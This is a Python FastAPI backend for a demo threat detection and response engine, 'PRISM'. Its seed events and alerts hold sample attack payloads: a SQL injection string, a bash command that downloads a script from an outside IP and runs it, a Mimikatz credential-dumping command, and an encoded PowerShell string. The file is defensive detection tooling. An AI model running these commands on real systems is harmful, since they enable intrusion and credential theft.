import asyncio
import json
import uuid
import re
import random
from datetime import datetime, timezone, timedelta
from typing import List, Dict, Any, Optional, Set

from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Query, HTTPException, Request, Response, status
from fastapi.middleware.cors import CORSMiddleware
from starlette.responses import StreamingResponse

try:
    from app.config import settings
    from app.services.detection_engine import DetectionEngine
    from app.services.threat_intel import DemoThreatIntelProvider, NVDProvider
    from app.services.scoring_engine import ScoringEngine, ResponseEngine
except ImportError:
    from backend.app.config import settings
    from backend.app.services.detection_engine import DetectionEngine
    from backend.app.services.threat_intel import DemoThreatIntelProvider, NVDProvider
    from backend.app.services.scoring_engine import ScoringEngine, ResponseEngine

app = FastAPI(
    title=settings.APP_NAME,
    version=settings.APP_VERSION,
    description="PRISM Threat Detection & Response Engine API"
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

detection_engine = DetectionEngine()
threat_intel = DemoThreatIntelProvider()
nvd_provider = NVDProvider()
scoring_engine = ScoringEngine()
response_engine = ResponseEngine(mode=settings.RESPONSE_MODE)

# ============================================================================
# IN-MEMORY DATA STORE (Mirroring PRISM SOC Engine)
# ============================================================================

def iso_now() -> str:
    return datetime.now(timezone.utc).isoformat()

def iso_past(minutes: int = 0, hours: int = 0) -> str:
    dt = datetime.now(timezone.utc) - timedelta(minutes=minutes, hours=hours)
    return dt.isoformat()

def gen_id(prefix: str) -> str:
    return f"{prefix}-{uuid.uuid4().hex[:8]}"

# Real-Time SSE Queues & Active WebSockets
sse_queues: Set[asyncio.Queue] = set()
active_connections: List[WebSocket] = []

demo_task: Optional[asyncio.Task] = None
is_demo_active: bool = False
response_mode: str = settings.RESPONSE_MODE.upper()

blocked_ips: Set[str] = {"185.220.101.45"}
isolated_hosts: Set[str] = {"db-core-01"}

# Detection Rules
detection_rules = [
    {
        "rule_id": "PRISM-SQL-001",
        "name": "SQL Injection Attack Detection",
        "description": "Detects SQL syntax injection patterns in HTTP parameters, bodies, and payloads",
        "attack_type": "SQL_INJECTION",
        "severity": "HIGH",
        "enabled": True,
        "confidence": 95
    },
    {
        "rule_id": "PRISM-RCE-001",
        "name": "Remote Code Execution Pattern",
        "description": "Detects command execution invocations, reverse shells, and shell binary calls",
        "attack_type": "RCE",
        "severity": "CRITICAL",
        "enabled": True,
        "confidence": 96
    },
    {
        "rule_id": "PRISM-MAL-001",
        "name": "Malware & Trojan Signature Detection",
        "description": "Identifies known malicious hashes, trojans, ransomware payloads, and cobalt strike beacons",
        "attack_type": "MALWARE",
        "severity": "CRITICAL",
        "enabled": True,
        "confidence": 94
    },
    {
        "rule_id": "PRISM-BF-001",
        "name": "Authentication Brute Force Detection",
        "description": "Monitors rapid failed authentication sequences from unified source IPs",
        "attack_type": "BRUTE_FORCE",
        "severity": "MEDIUM",
        "enabled": True,
        "confidence": 90
    },
    {
        "rule_id": "PRISM-SCAN-001",
        "name": "Network Port Scanning & Reconnaissance",
        "description": "Detects aggressive horizontal or vertical port probes within short timeframes",
        "attack_type": "PORT_SCAN",
        "severity": "MEDIUM",
        "enabled": True,
        "confidence": 88
    }
]

# IOC Catalog
iocs = [
    {
        "id": "ioc-001",
        "ioc": "185.220.101.45",
        "type": "IP",
        "threat_level": "critical",
        "source": "PRISM Threat Intelligence",
        "confidence": 94,
        "last_seen": iso_past(hours=1),
        "tags": ["Tor Exit Node", "SQLi Scanner", "Known Botnet"],
        "description": "Active attacker IP engaged in credential stuffing and web application exploitation."
    },
    {
        "id": "ioc-002",
        "ioc": "194.26.29.112",
        "type": "IP",
        "threat_level": "high",
        "source": "AlienVault OTX (Demo)",
        "confidence": 91,
        "last_seen": iso_past(hours=2),
        "tags": ["C2 Beacon", "RCE Origin", "Emotet"],
        "description": "Identified command-and-control server communicating with compromised endpoints."
    },
    {
        "id": "ioc-003",
        "ioc": "45.154.255.89",
        "type": "IP",
        "threat_level": "high",
        "source": "AbuseIPDB (Demo)",
        "confidence": 89,
        "last_seen": iso_past(hours=4),
        "tags": ["Port Scanner", "Mirai Probe"],
        "description": "Persistent automated port scanner probing enterprise SSH and RDP vectors."
    },
    {
        "id": "ioc-004",
        "ioc": "103.145.13.204",
        "type": "IP",
        "threat_level": "medium",
        "source": "PRISM Threat Intelligence",
        "confidence": 82,
        "last_seen": iso_past(hours=8),
        "tags": ["Brute Force", "Dict Attack"],
        "description": "Source of distributed dictionary attacks targeting public HTTPS endpoints."
    },
    {
        "id": "ioc-005",
        "ioc": "malicious-c2-update.org",
        "type": "DOMAIN",
        "threat_level": "critical",
        "source": "PRISM Threat Intelligence",
        "confidence": 96,
        "last_seen": iso_past(minutes=30),
        "tags": ["CobaltStrike", "Stager", "DNS Exfiltration"],
        "description": "Staging domain hosting second-stage payloads disguised as software updates."
    },
    {
        "id": "ioc-006",
        "ioc": "api-sync-telemetry.cc",
        "type": "DOMAIN",
        "threat_level": "high",
        "source": "ThreatFox (Demo)",
        "confidence": 90,
        "last_seen": iso_past(hours=3),
        "tags": ["Data Exfiltration", "Stealer"],
        "description": "Domain associated with RedLine infostealer telemetry exfiltration."
    },
    {
        "id": "ioc-007",
        "ioc": "44d88612fea8a8f36de82e1278abb02f",
        "type": "HASH",
        "threat_level": "critical",
        "source": "VirusTotal (Demo)",
        "confidence": 98,
        "last_seen": iso_past(minutes=15),
        "tags": ["Mimikatz", "LSASS Dump", "Credential Stealer"],
        "description": "Known binary signature of Mimikatz memory scraping utility."
    },
    {
        "id": "ioc-008",
        "ioc": "http://185.220.101.45/payload.sh",
        "type": "URL",
        "threat_level": "critical",
        "source": "URLhaus (Demo)",
        "confidence": 95,
        "last_seen": iso_past(hours=1),
        "tags": ["Bash Dropper", "RCE Payload"],
        "description": "Automated bash stager downloading rootkits onto compromised Linux servers."
    }
]

# CVE Records
cves = [
    {
        "cve_id": "CVE-2021-44228",
        "description": "Apache Log4j2 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints.",
        "cvss_score": 10.0,
        "severity": "CRITICAL",
        "affected_product": "Apache Log4j 2.0-beta9 through 2.15.0",
        "published_date": "2021-12-10",
        "source_type": "LIVE",
        "reference_url": "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"
    },
    {
        "cve_id": "CVE-2022-22965",
        "description": "Spring Framework RCE via Data Binding on JDK 9+ allows remote code execution when application runs on Tomcat as a WAR deployment.",
        "cvss_score": 9.8,
        "severity": "CRITICAL",
        "affected_product": "Spring Framework 5.3.0 to 5.3.17, 5.2.0 to 5.2.19",
        "published_date": "2022-04-01",
        "source_type": "LIVE",
        "reference_url": "https://nvd.nist.gov/vuln/detail/CVE-2022-22965"
    },
    {
        "cve_id": "CVE-2023-38606",
        "description": "SQL injection vulnerability in enterprise authentication portal allowing arbitrary database read/write.",
        "cvss_score": 8.8,
        "severity": "HIGH",
        "affected_product": "PRISM Auth Core Services",
        "published_date": "2023-08-15",
        "source_type": "DEMO"
    },
    {
        "cve_id": "CVE-2023-44487",
        "description": "HTTP/2 Rapid Reset attack vector enabling high-volume distributed denial of service.",
        "cvss_score": 7.5,
        "severity": "HIGH",
        "affected_product": "Standard HTTP/2 implementations",
        "published_date": "2023-10-10",
        "source_type": "LIVE"
    }
]

# Historical Events
events: List[Dict[str, Any]] = [
    {
        "event_id": "evt-init-01",
        "timestamp": iso_past(minutes=5),
        "source": "web_server",
        "source_ip": "185.220.101.45",
        "destination_ip": "10.0.1.25",
        "destination_port": 443,
        "hostname": "web-prod-01",
        "username": "admin",
        "event_type": "http_request",
        "protocol": "HTTPS",
        "method": "POST",
        "url": "/api/v1/auth/login",
        "payload": "' OR '1'='1 --",
        "user_agent": "sqlmap/1.7.2#stable"
    },
    {
        "event_id": "evt-init-02",
        "timestamp": iso_past(minutes=18),
        "source": "endpoint_agent",
        "source_ip": "194.26.29.112",
        "destination_ip": "10.0.2.10",
        "destination_port": 8080,
        "hostname": "db-core-01",
        "username": "www-data",
        "event_type": "process_event",
        "protocol": "HTTP",
        "method": "POST",
        "url": "/api/v1/management/exec",
        "payload": "; /bin/bash -c 'wget http://185.220.101.45/payload.sh -O /tmp/run; chmod +x /tmp/run; /tmp/run'",
        "process_name": "bash",
        "process_command": "bash -c wget http://185.220.101.45/payload.sh"
    },
    {
        "event_id": "evt-init-03",
        "timestamp": iso_past(minutes=35),
        "source": "endpoint_agent",
        "source_ip": "194.26.29.112",
        "destination_ip": "10.0.1.80",
        "destination_port": 443,
        "hostname": "api-checkout-prod",
        "username": "system",
        "event_type": "endpoint_event",
        "protocol": "HTTPS",
        "payload": "powershell -enc SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLi4u",
        "process_name": "mimikatz.exe",
        "process_command": "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit",
        "file_hash": "44d88612fea8a8f36de82e1278abb02f"
    },
    {
        "event_id": "evt-init-04",
        "timestamp": iso_past(minutes=50),
        "source": "auth_service",
        "source_ip": "103.145.13.204",
        "destination_ip": "10.0.1.50",
        "destination_port": 443,
        "hostname": "auth-gateway-01",
        "username": "root",
        "event_type": "auth_event",
        "protocol": "HTTPS",
        "payload": "admin:incorrect_password_hash_attempt"
    },
    {
        "event_id": "evt-init-05",
        "timestamp": iso_past(minutes=65),
        "source": "edge_firewall",
        "source_ip": "45.154.255.89",
        "destination_ip": "10.0.0.2",
        "destination_port": 3389,
        "hostname": "internal-dns-01",
        "event_type": "network_event",
        "protocol": "TCP",
        "payload": "SYN probe to target port 3389"
    }
]

# Historical Alerts
alerts: List[Dict[str, Any]] = [
    {
        "alert_id": "alt-001",
        "timestamp": iso_past(minutes=5),
        "event_id": "evt-init-01",
        "attack_type": "SQL_INJECTION",
        "source_ip": "185.220.101.45",
        "destination_ip": "10.0.1.25",
        "destination_port": 443,
        "hostname": "web-prod-01",
        "username": "admin",
        "url": "/api/v1/auth/login",
        "payload": "' OR '1'='1 --",
        "ioc_match": True,
        "ioc_details": {
            "ioc": "185.220.101.45",
            "type": "IP",
            "threat_level": "critical",
            "source": "PRISM Threat Intelligence",
            "confidence": 94
        },
        "cve_match": True,
        "cve_details": {
            "cve_id": "CVE-2023-38606",
            "cvss_score": 8.8,
            "severity": "HIGH",
            "affected_product": "PRISM Auth Core Services"
        },
        "threat_score": 87,
        "severity": "CRITICAL",
        "score_factors": {
            "attack_score": 35,
            "attack_type": "SQL_INJECTION",
            "ioc_score": 25,
            "ioc_matched": "185.220.101.45 (Tor Exit Node)",
            "cve_score": 15,
            "cve_matched": "CVE-2023-38606 (CVSS 8.8)",
            "asset_score": 9,
            "asset_hostname": "web-prod-01",
            "confidence_score": 5,
            "confidence_pct": 96,
            "total_score": 87,
            "severity": "CRITICAL",
            "reasons": [
                "SQL_INJECTION pattern confirmed (+35)",
                "Matched CRITICAL threat IOC (+25)",
                "Correlated with CVE-2023-38606 (+15)",
                "Production web server criticality (+9)",
                "Signature confidence 96% (+5)"
            ]
        },
        "status": "INVESTIGATING",
        "recommended_actions": ["BLOCK_IP", "CREATE_INCIDENT", "ESCALATE_SOC"],
        "executed_actions": ["BLOCK_IP", "CREATE_INCIDENT"],
        "response_mode": "SIMULATION",
        "incident_id": "inc-001"
    },
    {
        "alert_id": "alt-002",
        "timestamp": iso_past(minutes=18),
        "event_id": "evt-init-02",
        "attack_type": "RCE",
        "source_ip": "194.26.29.112",
        "destination_ip": "10.0.2.10",
        "destination_port": 8080,
        "hostname": "db-core-01",
        "username": "www-data",
        "url": "/api/v1/management/exec",
        "payload": "; /bin/bash -c 'wget http://185.220.101.45/payload.sh'",
        "ioc_match": True,
        "ioc_details": {
            "ioc": "194.26.29.112",
            "type": "IP",
            "threat_level": "high",
            "source": "AlienVault OTX (Demo)",
            "confidence": 91
        },
        "cve_match": True,
        "cve_details": {
            "cve_id": "CVE-2021-44228",
            "cvss_score": 10.0,
            "severity": "CRITICAL",
            "affected_product": "Apache Log4j"
        },
        "threat_score": 96,
        "severity": "CRITICAL",
        "score_factors": {
            "attack_score": 40,
            "attack_type": "RCE",
            "ioc_score": 20,
            "ioc_matched": "194.26.29.112 (C2 Beacon)",
            "cve_score": 20,
            "cve_matched": "CVE-2021-44228 (CVSS 10.0)",
            "asset_score": 10,
            "asset_hostname": "db-core-01",
            "confidence_score": 5,
            "confidence_pct": 98,
            "total_score": 96,
            "severity": "CRITICAL",
            "reasons": [
                "RCE shell invocation pattern (+40)",
                "C2 origin IOC confirmed (+20)",
                "Correlated with Log4j CVE-2021-44228 (+20)",
                "Tier-0 Database asset criticality (+10)",
                "Rule confidence 98% (+5)"
            ]
        },
        "status": "CONTAINED",
        "recommended_actions": ["BLOCK_IP", "ISOLATE_HOST", "KILL_PROCESS", "CREATE_INCIDENT", "ESCALATE_SOC"],
        "executed_actions": ["BLOCK_IP", "ISOLATE_HOST", "CREATE_INCIDENT"],
        "response_mode": "SIMULATION",
        "incident_id": "inc-002"
    },
    {
        "alert_id": "alt-003",
        "timestamp": iso_past(minutes=35),
        "event_id": "evt-init-03",
        "attack_type": "MALWARE",
        "source_ip": "194.26.29.112",
        "destination_ip": "10.0.1.80",
        "destination_port": 443,
        "hostname": "api-checkout-prod",
        "username": "system",
        "payload": "powershell -enc SUVYI...",
        "ioc_match": True,
        "ioc_details": {
            "ioc": "44d88612fea8a8f36de82e1278abb02f",
            "type": "HASH",
            "threat_level": "critical",
            "source": "VirusTotal (Demo)",
            "confidence": 98
        },
        "cve_match": False,
        "threat_score": 82,
        "severity": "CRITICAL",
        "score_factors": {
            "attack_score": 38,
            "attack_type": "MALWARE",
            "ioc_score": 25,
            "ioc_matched": "Mimikatz LSASS hash match",
            "cve_score": 0,
            "asset_score": 8,
            "asset_hostname": "api-checkout-prod",
            "confidence_score": 5,
            "confidence_pct": 95,
            "total_score": 82,
            "severity": "CRITICAL",
            "reasons": [
                "Mimikatz executable signature (+38)",
                "Known malicious hash cataloged (+25)",
                "PCI DSS checkout tier criticality (+8)",
                "Signature confidence 95% (+5)"
            ]
        },
        "status": "NEW",
        "recommended_actions": ["KILL_PROCESS", "ISOLATE_HOST", "CREATE_INCIDENT"],
        "executed_actions": ["ISOLATE_HOST"],
        "response_mode": "SIMULATION",
        "incident_id": "inc-003"
    },
    {
        "alert_id": "alt-004",
        "timestamp": iso_past(minutes=50),
        "event_id": "evt-init-04",
        "attack_type": "BRUTE_FORCE",
        "source_ip": "103.145.13.204",
        "destination_ip": "10.0.1.50",
        "destination_port": 443,
        "hostname": "auth-gateway-01",
        "username": "root",
        "payload": "admin:incorrect_password_hash_attempt",
        "ioc_match": True,
        "ioc_details": {
            "ioc": "103.145.13.204",
            "type": "IP",
            "threat_level": "medium",
            "source": "PRISM Threat Intelligence",
            "confidence": 82
        },
        "cve_match": False,
        "threat_score": 54,
        "severity": "MEDIUM",
        "score_factors": {
            "attack_score": 25,
            "attack_type": "BRUTE_FORCE",
            "ioc_score": 12,
            "ioc_matched": "103.145.13.204 (Dict Attack)",
            "cve_score": 0,
            "asset_score": 7,
            "asset_hostname": "auth-gateway-01",
            "confidence_score": 4,
            "confidence_pct": 90,
            "total_score": 54,
            "severity": "MEDIUM",
            "reasons": [
                "Multiple auth failures detected (+25)",
                "Known brute force IP (+12)",
                "Gateway tier criticality (+7)",
                "Confidence 90% (+4)"
            ]
        },
        "status": "RESOLVED",
        "recommended_actions": ["BLOCK_IP"],
        "executed_actions": ["BLOCK_IP"],
        "response_mode": "SIMULATION"
    },
    {
        "alert_id": "alt-005",
        "timestamp": iso_past(minutes=65),
        "event_id": "evt-init-05",
        "attack_type": "PORT_SCAN",
        "source_ip": "45.154.255.89",
        "destination_ip": "10.0.0.2",
        "destination_port": 3389,
        "hostname": "internal-dns-01",
        "payload": "SYN probe to target port 3389",
        "ioc_match": True,
        "ioc_details": {
            "ioc": "45.154.255.89",
            "type": "IP",
            "threat_level": "high",
            "source": "AbuseIPDB (Demo)",
            "confidence": 89
        },
        "cve_match": False,
        "threat_score": 48,
        "severity": "MEDIUM",
        "score_factors": {
            "attack_score": 20,
            "attack_type": "PORT_SCAN",
            "ioc_score": 15,
            "ioc_matched": "45.154.255.89 (Mirai Scanner)",
            "cve_score": 0,
            "asset_score": 6,
            "asset_hostname": "internal-dns-01",
            "confidence_score": 4,
            "confidence_pct": 88,
            "total_score": 48,
            "severity": "MEDIUM",
            "reasons": [
                "Sequential port probe signature (+20)",
                "AbuseIPDB high confidence scanner (+15)",
                "Internal asset criticality (+6)",
                "Confidence 88% (+4)"
            ]
        },
        "status": "FALSE_POSITIVE",
        "recommended_actions": [],
        "executed_actions": [],
        "response_mode": "SIMULATION"
    }
]

# Incidents
incidents: List[Dict[str, Any]] = [
    {
        "incident_id": "inc-001",
        "alert_id": "alt-001",
        "title": "SQL Injection Exploitation on Auth Endpoint",
        "timestamp": iso_past(minutes=5),
        "severity": "CRITICAL",
        "threat_score": 87,
        "status": "INVESTIGATING",
        "source_ip": "185.220.101.45",
        "hostname": "web-prod-01",
        "attack_type": "SQL_INJECTION",
        "summary": "High-risk SQL syntax injection originating from Tor exit node targeting user authentication portal.",
        "assigned_to": "SOC-Tier2-Analyst",
        "actions_taken": ["BLOCK_IP", "CREATE_INCIDENT"],
        "why_detected": [
            "SQL keywords in URL parameter",
            "Tor exit node reputation confirmed",
            "Correlated with CVE-2023-38606"
        ]
    },
    {
        "incident_id": "inc-002",
        "alert_id": "alt-002",
        "title": "Remote Code Execution & Stager Deployment on db-core-01",
        "timestamp": iso_past(minutes=18),
        "severity": "CRITICAL",
        "threat_score": 96,
        "status": "CONTAINED",
        "source_ip": "194.26.29.112",
        "hostname": "db-core-01",
        "attack_type": "RCE",
        "summary": "Shell payload download attempted via bash stager on primary database server.",
        "assigned_to": "Incident-Commander-Alpha",
        "actions_taken": ["BLOCK_IP", "ISOLATE_HOST", "CREATE_INCIDENT"],
        "why_detected": [
            "Bash wget stager command executed",
            "Attacker IP listed in AlienVault OTX C2",
            "Target host is high-criticality database tier"
        ]
    },
    {
        "incident_id": "inc-003",
        "alert_id": "alt-003",
        "title": "Credential Dumper Activity on Checkout Host",
        "timestamp": iso_past(minutes=35),
        "severity": "CRITICAL",
        "threat_score": 82,
        "status": "NEW",
        "source_ip": "194.26.29.112",
        "hostname": "api-checkout-prod",
        "attack_type": "MALWARE",
        "summary": "Mimikatz binary execution detected attempting memory scraping of LSASS credentials.",
        "assigned_to": "SOC-Lead",
        "actions_taken": ["ISOLATE_HOST"],
        "why_detected": [
            "Known malware hash matched VirusTotal database",
            "Process memory access anomaly identified"
        ]
    }
]

# Response Audits
response_audits: List[Dict[str, Any]] = [
    {
        "id": "aud-001",
        "timestamp": iso_past(minutes=5),
        "actor": "PRISM-AUTO",
        "action": "BLOCK_IP",
        "target": "185.220.101.45",
        "reason": "Simulated automated firewall block for high-threat SQL injection attack",
        "threat_score": 87,
        "mode": "SIMULATION",
        "result": "SUCCESS",
        "details": {"attack_type": "SQL_INJECTION", "ioc_match": True}
    },
    {
        "id": "aud-002",
        "timestamp": iso_past(minutes=18),
        "actor": "PRISM-AUTO",
        "action": "ISOLATE_HOST",
        "target": "db-core-01",
        "reason": "Simulated host quarantine isolation due to critical RCE command execution",
        "threat_score": 96,
        "mode": "SIMULATION",
        "result": "SUCCESS",
        "details": {"attack_type": "RCE", "hostname": "db-core-01"}
    },
    {
        "id": "aud-003",
        "timestamp": iso_past(minutes=35),
        "actor": "PRISM-AUTO",
        "action": "ISOLATE_HOST",
        "target": "api-checkout-prod",
        "reason": "Simulated endpoint containment following Mimikatz detection",
        "threat_score": 82,
        "mode": "SIMULATION",
        "result": "SUCCESS",
        "details": {"attack_type": "MALWARE"}
    }
]

# ============================================================================
# HELPER FUNCTIONS & SSE BROADCASTER
# ============================================================================

def get_summary() -> Dict[str, Any]:
    total_events = len(events)
    active_threats = sum(1 for a in alerts if a.get("status") in ["NEW", "INVESTIGATING"])
    critical_alerts = sum(
        1 for a in alerts 
        if a.get("severity") == "CRITICAL" and a.get("status") not in ["RESOLVED", "FALSE_POSITIVE"]
    )
    blocked_count = len(blocked_ips)
    open_incidents = sum(1 for i in incidents if i.get("status") in ["NEW", "INVESTIGATING"])
    scores = [a.get("threat_score", 0) for a in alerts]
    avg_score = round(sum(scores) / max(len(scores), 1))

    return {
        "total_events": total_events,
        "active_threats": active_threats,
        "critical_alerts": critical_alerts,
        "blocked_ips": blocked_count,
        "open_incidents": open_incidents,
        "average_threat_score": avg_score,
        "response_mode": response_mode,
        "system_status": "healthy"
    }

def broadcast(event_type: str, payload: Any):
    msg = {"type": event_type, "payload": payload}
    # Deliver to SSE queues
    for q in list(sse_queues):
        try:
            q.put_nowait(msg)
        except Exception:
            pass
    # Deliver to WebSockets
    for ws in list(active_connections):
        try:
            asyncio.create_task(ws.send_json(msg))
        except Exception:
            pass

async def process_security_event(raw_event: Dict[str, Any]) -> Dict[str, Any]:
    event_id = raw_event.get("event_id") or gen_id("evt")
    normalized_event = {
        "event_id": event_id,
        "timestamp": raw_event.get("timestamp") or iso_now(),
        "source": raw_event.get("source") or "web_server",
        "source_ip": raw_event.get("source_ip") or "185.220.101.45",
        "destination_ip": raw_event.get("destination_ip") or "10.0.1.25",
        "destination_port": raw_event.get("destination_port") or 443,
        "hostname": raw_event.get("hostname") or "web-prod-01",
        "username": raw_event.get("username") or "admin",
        "event_type": raw_event.get("event_type") or "http_request",
        "protocol": raw_event.get("protocol") or "HTTP",
        "method": raw_event.get("method") or "POST",
        "url": raw_event.get("url") or "/login",
        "payload": raw_event.get("payload") or "",
        "user_agent": raw_event.get("user_agent") or "Mozilla/5.0",
        "process_name": raw_event.get("process_name"),
        "process_command": raw_event.get("process_command"),
        "file_hash": raw_event.get("file_hash"),
        "domain": raw_event.get("domain")
    }

    events.insert(0, normalized_event)
    if len(events) > 500:
        events.pop()

    trace = [
        {
            "step": 1,
            "title": "Event Normalization",
            "status": "COMPLETED",
            "output": f"Normalized {normalized_event['event_type']} event [{normalized_event['event_id']}] from {normalized_event['source_ip']} to {normalized_event['hostname']}"
        }
    ]

    # 1. Detection
    detection = detection_engine.detect(normalized_event)
    if not detection:
        trace.append({
            "step": 2,
            "title": "Attack Detection",
            "status": "BYPASSED",
            "output": "Event evaluated as benign traffic. No detection signatures matched."
        })
        return {
            "event": normalized_event,
            "is_attack": False,
            "simulation_trace": trace
        }

    trace.append({
        "step": 2,
        "title": "Attack Detection",
        "status": "COMPLETED",
        "output": f"Identified {detection['attack_type']} attack (Rule: {detection['rule_id']}, Confidence: {detection['confidence']}%)"
    })

    # 2. IOC Correlation
    src_ip = normalized_event["source_ip"]
    matched_ioc_obj = next((item for item in iocs if item["ioc"] == src_ip or item["ioc"] == normalized_event.get("file_hash")), None)
    if not matched_ioc_obj:
        matched_ioc_obj = await threat_intel.check_ip(src_ip)

    ioc_match = matched_ioc_obj is not None
    ioc_level = matched_ioc_obj.get("threat_level", "low") if matched_ioc_obj else "low"

    trace.append({
        "step": 3,
        "title": "IOC Correlation",
        "status": "COMPLETED" if ioc_match else "BYPASSED",
        "output": f"IOC match identified! [{src_ip}] Level: {ioc_level.upper()}" if ioc_match else "Source IP and indicators cleared against known threat databases."
    })

    # 3. CVE Correlation
    cve_list = await nvd_provider.fetch_cves(detection["attack_type"])
    cve_obj = cve_list[0] if cve_list else None
    cve_match = cve_obj is not None

    trace.append({
        "step": 4,
        "title": "CVE Correlation",
        "status": "COMPLETED" if cve_match else "BYPASSED",
        "output": f"Vulnerability match: {cve_obj['cve_id']} (CVSS {cve_obj.get('cvss_score', 8.5)})" if cve_match else "No specific unpatched CVE profile matched for target service."
    })

    # 4. Scoring
    score_res = scoring_engine.calculate_score(
        event=normalized_event,
        attack_type=detection["attack_type"],
        confidence_pct=detection["confidence"],
        ioc_match=ioc_match,
        ioc_threat_level=ioc_level,
        cve_match=cve_match,
        cvss_score=cve_obj["cvss_score"] if cve_obj else 0.0,
        asset_criticality_score=9
    )

    trace.append({
        "step": 5,
        "title": "Explainable Threat Scoring",
        "status": "COMPLETED",
        "output": f"Computed Threat Score: {score_res['total_score']}/100 ({score_res['severity']} Severity)"
    })

    # 5. Response Decision
    resp_eval = response_engine.evaluate_response(
        threat_score=score_res["total_score"],
        severity=score_res["severity"],
        source_ip=src_ip,
        hostname=normalized_event["hostname"]
    )

    alert_id = gen_id("alt")
    alert_record = {
        "alert_id": alert_id,
        "timestamp": normalized_event["timestamp"],
        "event_id": normalized_event["event_id"],
        "attack_type": detection["attack_type"],
        "source_ip": normalized_event["source_ip"],
        "destination_ip": normalized_event["destination_ip"],
        "destination_port": normalized_event.get("destination_port", 443),
        "hostname": normalized_event["hostname"],
        "username": normalized_event.get("username", "admin"),
        "url": normalized_event.get("url"),
        "payload": normalized_event.get("payload"),
        "ioc_match": ioc_match,
        "ioc_details": {
            "ioc": matched_ioc_obj["ioc"],
            "type": matched_ioc_obj.get("type", "IP"),
            "threat_level": ioc_level,
            "source": matched_ioc_obj.get("source", "PRISM Threat Intelligence"),
            "confidence": matched_ioc_obj.get("confidence", 90)
        } if ioc_match else None,
        "cve_match": cve_match,
        "cve_details": {
            "cve_id": cve_obj["cve_id"],
            "cvss_score": cve_obj.get("cvss_score", 9.0),
            "severity": cve_obj.get("severity", "CRITICAL"),
            "affected_product": cve_obj.get("affected_product", "Core Web Stack")
        } if cve_match else None,
        "threat_score": score_res["total_score"],
        "severity": score_res["severity"],
        "score_factors": {
            "attack_score": score_res["attack_score"],
            "attack_type": detection["attack_type"],
            "ioc_score": score_res["ioc_score"],
            "ioc_matched": f"{src_ip} ({ioc_level})" if ioc_match else None,
            "cve_score": score_res["cve_score"],
            "cve_matched": f"{cve_obj['cve_id']}" if cve_match else None,
            "asset_score": score_res["asset_score"],
            "asset_hostname": normalized_event["hostname"],
            "confidence_score": score_res["confidence_score"],
            "confidence_pct": detection["confidence"],
            "total_score": score_res["total_score"],
            "severity": score_res["severity"],
            "reasons": score_res["reasons"]
        },
        "status": "NEW",
        "recommended_actions": resp_eval["recommended"],
        "executed_actions": resp_eval["executed"],
        "response_mode": response_mode,
        "incident_id": None
    }

    # If action executed, log response audit
    if "BLOCK_IP" in resp_eval["executed"]:
        blocked_ips.add(src_ip)
        audit = {
            "id": gen_id("aud"),
            "timestamp": iso_now(),
            "actor": "PRISM-AUTO",
            "action": "BLOCK_IP",
            "target": src_ip,
            "reason": f"Simulated block triggered by {score_res['severity']} {detection['attack_type']} attack",
            "threat_score": score_res["total_score"],
            "mode": response_mode,
            "result": "SUCCESS"
        }
        response_audits.insert(0, audit)

    if "ISOLATE_HOST" in resp_eval["executed"]:
        isolated_hosts.add(normalized_event["hostname"])
        audit = {
            "id": gen_id("aud"),
            "timestamp": iso_now(),
            "actor": "PRISM-AUTO",
            "action": "ISOLATE_HOST",
            "target": normalized_event["hostname"],
            "reason": f"Simulated host quarantine isolation triggered by {score_res['severity']} attack",
            "threat_score": score_res["total_score"],
            "mode": response_mode,
            "result": "SUCCESS"
        }
        response_audits.insert(0, audit)

    incident_record = None
    if "CREATE_INCIDENT" in resp_eval["executed"] or score_res["severity"] in ["CRITICAL", "HIGH"]:
        inc_id = gen_id("inc")
        alert_record["incident_id"] = inc_id
        incident_record = {
            "incident_id": inc_id,
            "alert_id": alert_id,
            "title": f"Active {detection['attack_type'].replace('_', ' ')} incident on {normalized_event['hostname']}",
            "timestamp": iso_now(),
            "severity": score_res["severity"],
            "threat_score": score_res["total_score"],
            "status": "INVESTIGATING",
            "source_ip": src_ip,
            "hostname": normalized_event["hostname"],
            "attack_type": detection["attack_type"],
            "summary": f"Automated detection triggered for {detection['attack_type']} against {normalized_event['hostname']}.",
            "assigned_to": "SOC-Analyst-Tier1",
            "actions_taken": resp_eval["executed"],
            "why_detected": score_res["reasons"]
        }
        incidents.insert(0, incident_record)

    alerts.insert(0, alert_record)
    if len(alerts) > 200:
        alerts.pop()

    trace.append({
        "step": 6,
        "title": "Automated Response Execution",
        "status": "COMPLETED" if resp_eval["executed"] else "BYPASSED",
        "output": f"Executed in {response_mode} mode: [{', '.join(resp_eval['executed'])}]" if resp_eval["executed"] else "Score below automated mitigation threshold. Routed to SOC monitoring."
    })

    if incident_record:
        trace.append({
            "step": 7,
            "title": "SOC Incident Creation",
            "status": "COMPLETED",
            "output": f"Created Incident #{incident_record['incident_id']} and escalated to on-call SOC team"
        })

    # Broadcast event via SSE and WebSockets
    broadcast("ALERT_CREATED", {
        "alert": alert_record,
        "incident": incident_record,
        "summary": get_summary()
    })

    return {
        "event": normalized_event,
        "is_attack": True,
        "alert": alert_record,
        "incident": incident_record,
        "explainable_breakdown": {
            "factors": [
                {"factor": "Base Attack Severity", "score": score_res["attack_score"], "detail": f"{detection['attack_type']} pattern matched"},
                {"factor": "IOC Match", "score": score_res["ioc_score"], "detail": f"{src_ip} ({ioc_level})" if ioc_match else "No IOC match"},
                {"factor": "CVE Correlation", "score": score_res["cve_score"], "detail": cve_obj["cve_id"] if cve_match else "No specific CVE"},
                {"factor": "Asset Criticality", "score": score_res["asset_score"], "detail": f"{normalized_event['hostname']} tier weighting"},
                {"factor": "Detection Confidence", "score": score_res["confidence_score"], "detail": f"{detection['confidence']}% rule confidence"}
            ],
            "total": score_res["total_score"],
            "severity": score_res["severity"]
        },
        "simulation_trace": trace
    }

# ============================================================================
# API ROUTES
# ============================================================================

# 1. Health
@app.get("/api/health")
async def health_check():
    return {
        "status": "healthy",
        "database": "connected",
        "threat_intelligence": "available",
        "response_engine": response_mode.lower(),
        "version": settings.APP_VERSION
    }

# 2. Dashboard Summary
@app.get("/api/dashboard/summary")
async def dashboard_summary():
    return get_summary()

# 3. Events
@app.get("/api/events")
async def get_events(limit: int = 50, search: str = ""):
